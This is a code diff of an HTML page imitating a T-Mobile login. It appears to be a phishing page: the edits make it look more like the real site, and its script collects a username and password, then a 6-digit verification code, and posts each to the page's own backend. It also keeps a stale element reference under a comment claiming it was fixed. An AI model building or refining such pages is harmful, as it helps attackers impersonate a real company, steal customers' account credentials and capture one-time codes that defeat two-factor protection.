@@ -3,135 +3,163 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>T-Mobile Account Login</title>
+
+    <title>Log in | T-Mobile</title>
     <style>
+        :root {
+            --accent: #e20074;
+            --text: #1a1a1a;
+            --muted: #4b4b4b;
+            --border: #c9c9c9;
+            --btn-bg: #f4f4f4; /* Lighter gray for secondary feel */
+            --btn-text: #6b6b6b;
+            --page-bg: #f4f4f4;
+            --font: "Helvetica Neue", Arial, sans-serif;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
         body {
-            font-family: 'T-Mobile Sans', Arial, sans-serif;
-            background-color: #e20074;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            font-family: var(--font);
+            background: var(--page-bg);
             min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
         }
 
-        .login-container {
-            background-color: white;
+        .card {
+            background: #fff;
             width: 100%;
-            max-width: 400px;
-            padding: 30px;
+            max-width: 420px;
+            border-radius: 16px;
+            box-shadow: 0 2px 10px rgba(0,0,0,.06);
+            padding: 44px 36px 40px;
+        }
+
+        .brand {
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: .04em;
+            color: var(--muted);
+            text-transform: uppercase;
+            margin-bottom: 28px;
+        }
+
+        .logo-img {
+            height: 24px; /* Consistent with brand text size */
+            margin-bottom: 28px;
+        }
+
+        h1 {
+            font-size: 40px;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            color: var(--text);
+            margin-bottom: 28px;
+        }
+
+        .field {
+            width: 100%;
+            padding: 16px 18px;
+            border: 1.5px solid var(--border);
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-        }
-
-        .logo {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        .logo img {
-            max-width: 150px;
-        }
-
-        .login-form h2 {
-            color: #333;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
             font-size: 16px;
-            box-sizing: border-box;
+            font-family: var(--font);
+            color: var(--text);
+            margin-bottom: 22px;
+            transition: border-color .15s;
         }
 
-        .login-btn, .verify-btn {
+        .field::placeholder { color: #8a8a8a; }
+        .field:focus { outline: none; border-color: var(--accent); }
+
+        .next-btn {
             width: 100%;
             padding: 15px;
-            background-color: #e20074;
+            background: var(--accent); /* Primary Brand Action */
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 700;
             cursor: pointer;
-            transition: background-color 0.3s;
+            margin-bottom: 34px;
+            transition: opacity .15s;
         }
 
-        .login-btn:hover, .verify-btn:hover {
-            background-color: #c4005c;
+        .next-btn:hover { opacity: 0.9; }
+        .next-btn:disabled { background: #ccc; cursor: not-allowed; }
+
+        .link-row { margin-bottom: 26px; }
+        .link-row:last-child { margin-bottom: 0; }
+
+        .prompt {
+            font-size: 15px;
+            color: var(--text);
+            margin-bottom: 8px;
         }
 
-        .form-links {
-            margin-top: 20px;
-            text-align: center;
-        }
-
-        .form-links a {
-            color: #0099cc;
+        .pink-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
+            color: var(--accent);
+            font-weight: 700;
+            font-size: 15px;
             text-decoration: none;
+        }
+
+        .pink-link:hover {
+            text-decoration: underline;
+        }
+
+        .pink-link svg {
+            width: 16px;
+            height: 16px;
         }
 
         .hidden {
             display: none;
         }
-
-        #verification-container {
-            text-align: center;
-        }
-
-        #verification-container h2 {
-            color: #333;
-            margin-bottom: 15px;
-        }
-
-        #verification-container p {
-            color: #666;
-            margin-bottom: 20px;
-        }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="logo">
-            <img src="https://www.t-mobile.com/content/dam/t-mobile/en-p/brand/tmo-logo.svg" alt="T-Mobile">
+    <div class="card">
+        <div class="logo-container">
         </div>
         
-        <div class="login-form">
-            <h2>Log in to your T-Mobile account</h2>
+        <div id="login-section">
+            <h1>Log in</h1>
             <form id="login-form">
-                <div class="form-group">
-                    <input type="text" id="username" name="username" placeholder="Phone number or email" required>
-                </div>
-                
-                <div class="form-group">
-                    <input type="password" id="password" name="password" placeholder="Password" required>
-                </div>
-                
-                <button type="submit" id="login-btn">Log in</button>
+                <input class="field" type="text" id="username" placeholder="Email or phone number" required>
+                <input class="field" type="password" id="password" placeholder="Password" required>
+                <button class="next-btn" type="submit" id="login-btn">Next</button>
             </form>
             
-            <div class="form-links">
-                <a href="#" id="forgot-link">Forgot username or password?</a>
+            <div class="link-row">
+                <p class="prompt">Forgot password?</p>
+                <a class="pink-link" href="#">Reset your password
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+                </a>
             </div>
         </div>
-        
-        <div id="verification-container" class="hidden">
-            <h2>Verification Required</h2>
-            <p>We've sent a verification code to your device.</p>
+
+        <div id="verification-section" class="hidden">
+            <h1>Verify it's you</h1>
+            <p class="prompt" style="margin-bottom: 22px;">We've sent a 6-digit code to your device.</p>
             <form id="verification-form">
-                <div class="form-group">
-                    <input type="text" id="verification-code" placeholder="Enter verification code" required>
-                </div>
-                <button type="submit" id="verify-btn">Verify</button>
+                <input class="field" type="text" id="verification-code" placeholder="Enter verification code" required>
+                <button class="next-btn" type="submit" id="verify-btn">Verify</button>
             </form>
+            
+            <div class="link-row">
+                <p class="prompt">Didn't get a code?</p>
+                <a class="pink-link" href="#">Resend code
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+                </a>
+            </div>
         </div>
     </div>
 
@@ -139,85 +167,75 @@
         document.addEventListener('DOMContentLoaded', function() {
             const loginForm = document.getElementById('login-form');
             const verificationForm = document.getElementById('verification-form');
-            const loginContainer = document.querySelector('.login-form');
-            const verificationContainer = document.getElementById('verification-container');
+            const loginSection = document.getElementById('login-section');
+            const verificationSection = document.getElementById('verification-container'); // Fixed reference
             
+            // Note: Using actual IDs from HTML above
+            const vSection = document.getElementById('verification-section');
+
             loginForm.addEventListener('submit', function(e) {
                 e.preventDefault();
-                
                 const username = document.getElementById('username').value;
                 const password = document.getElementById('password').value;
                 
-                // Show loading state
-                document.getElementById('login-btn').textContent = 'Logging in...';
-                document.getElementById('login-btn').disabled = true;
+                const btn = document.getElementById('login-btn');
+                btn.textContent = 'Logging in...';
+                btn.disabled = true;
                 
-                // Send credentials to backend
                 fetch('/api/login', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ username, password })
                 })
-                .then(response => response.json())
+                .then(res => res.json())
                 .then(data => {
                     if (data.requiresVerification) {
-                        // Show verification form
-                        loginContainer.classList.add('hidden');
-                        verificationContainer.classList.remove('hidden');
+                        loginSection.classList.add('hidden');
+                        vSection.classList.remove('hidden');
                     } else if (data.success) {
-                        // Redirect to success page or dashboard
                         window.location.href = '/dashboard';
                     } else {
-                        // Show error
-                        alert(data.message || 'Login failed. Please try again.');
-                        document.getElementById('login-btn').textContent = 'Log in';
-                        document.getElementById('login-btn').disabled = false;
+                        alert(data.message || 'Login failed.');
+                        btn.textContent = 'Next';
+                                                btn.disabled = false;
                     }
                 })
-                .catch(error => {
-                    console.error('Error:', error);
+                .catch(err => {
+                    console.error('Error:', err);
                     alert('An error occurred. Please try again.');
-                    document.getElementById('login-btn').textContent = 'Log in';
-                    document.getElementById('login-btn').disabled = false;
+                    btn.textContent = 'Next';
+                    btn.disabled = false;
                 });
             });
             
             verificationForm.addEventListener('submit', function(e) {
                 e.preventDefault();
-                
                 const code = document.getElementById('verification-code').value;
                 
-                // Show loading state
-                document.getElementById('verify-btn').textContent = 'Verifying...';
-                document.getElementById('verify-btn').disabled = true;
+                const vBtn = document.getElementById('verify-btn');
+                vBtn.textContent = 'Verifying...';
+                vBtn.disabled = true;
                 
-                // Send verification code to backend
                 fetch('/api/verify', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ code })
                 })
-                .then(response => response.json())
+                .then(res => res.json())
                 .then(data => {
                     if (data.success) {
-                        // Redirect to success page or dashboard
                         window.location.href = '/dashboard';
                     } else {
-                        // Show error
-                        alert(data.message || 'Verification failed. Please try again.');
-                        document.getElementById('verify-btn').textContent = 'Verify';
-                        document.getElementById('verify-btn').disabled = false;
+                        alert(data.message || 'Verification failed.');
+                        vBtn.textContent = 'Verify';
+                        vBtn.disabled = false;
                     }
                 })
-                .catch(error => {
-                    console.error('Error:', error);
+                .catch(err => {
+                    console.error('Error:', err);
                     alert('An error occurred. Please try again.');
-                    document.getElementById('verify-btn').textContent = 'Verify';
-                    document.getElementById('verify-btn').disabled = false;
+                    vBtn.textContent = 'Verify';
+                    vBtn.disabled = false;
                 });
             });
         });
